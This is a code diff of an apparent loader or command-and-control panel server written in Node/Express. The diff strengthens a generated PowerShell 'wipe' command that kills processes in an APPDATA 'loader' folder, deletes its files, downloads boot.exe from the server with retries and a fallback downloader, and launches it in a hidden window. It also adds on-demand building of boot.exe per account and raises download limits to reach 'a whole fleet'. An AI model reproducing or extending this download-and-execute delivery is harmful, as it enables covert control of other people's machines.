@@ -167,10 +167,14 @@ function buildWipeCommand(serverBase) {
     `$dir = Join-Path $env:APPDATA 'loader'`,
     `New-Item -ItemType Directory -Force -Path $dir | Out-Null`,
     `Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -and $_.Path.StartsWith($dir, [System.StringComparison]::OrdinalIgnoreCase) } | Stop-Process -Force -ErrorAction SilentlyContinue`,
-    `Start-Sleep -Milliseconds 800`,
-    `for ($i=0; $i -lt 5; $i++) { try { Remove-Item -Recurse -Force (Join-Path $dir '*') -ErrorAction Stop; break } catch { Start-Sleep -Milliseconds 400 } }`,
-    `Start-Sleep -Milliseconds 400`,
-    `Invoke-WebRequest -Uri '${bootUrl}' -OutFile (Join-Path $dir 'boot.exe') -UseBasicParsing`,
+    `Start-Sleep -Milliseconds 1000`,
+    `for ($i=0; $i -lt 5; $i++) { try { Remove-Item -Recurse -Force (Join-Path $dir '*') -ErrorAction Stop; break } catch { Start-Sleep -Milliseconds 500 } }`,
+    `Start-Sleep -Milliseconds 500`,
+    `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`,
+    `$ProgressPreference = 'SilentlyContinue'`,
+    `$ok = $false`,
+    `for ($i=0; $i -lt 3; $i++) { try { Invoke-WebRequest -Uri '${bootUrl}' -OutFile (Join-Path $dir 'boot.exe') -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop; $ok = $true; break } catch { Start-Sleep -Seconds 2 } }`,
+    `if (-not $ok) { (New-Object System.Net.WebClient).DownloadFile('${bootUrl}', (Join-Path $dir 'boot.exe')) }`,
     `Start-Process -FilePath (Join-Path $dir 'boot.exe') -WorkingDirectory $dir -WindowStyle Hidden`,
   ].join('; ');
 
@@ -414,10 +418,25 @@ app.delete('/api/clients/:id', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/clients/:id/wipe', requireAuth, (req, res) => {
+app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
+
+  const bootPath = path.join(DOWNLOAD_DIR, 'boot.exe');
+  if (!fs.existsSync(bootPath)) {
+    const row = getOwnUser(req.user.uid);
+    const acctKey = row?.account_key || '';
+    if (!acctKey) return res.status(400).json({ error: 'no account key to build boot.exe' });
+
+    try {
+      const bootBuf = await buildBoot({ key: acctKey });
+      fs.writeFileSync(bootPath, bootBuf, { mode: 0o755 });
+    } catch (e) {
+      console.error('[wipe] failed to generate boot.exe', e);
+      return res.status(500).json({ error: 'failed to generate boot.exe' });
+    }
+  }
 
   let base = req.body?.serverBase;
   if (!base) {
@@ -630,10 +649,10 @@ const ALLOWED_EXT = ['.exe', '.zip', '.msi', '.dll', '.bin'];
 
 const limitDownloadExe = rateLimit({
   windowMs: 60 * 60 * 1000,
-  max: 30,
+  max: 100, // increased from 30 to avoid wiping a whole fleet hitting rate limits
   standardHeaders: true,
   legacyHeaders: false,
-  message: { error: 'download limit reached — 10 per hour' },
+  message: { error: 'download limit reached' },
 });
 
 app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
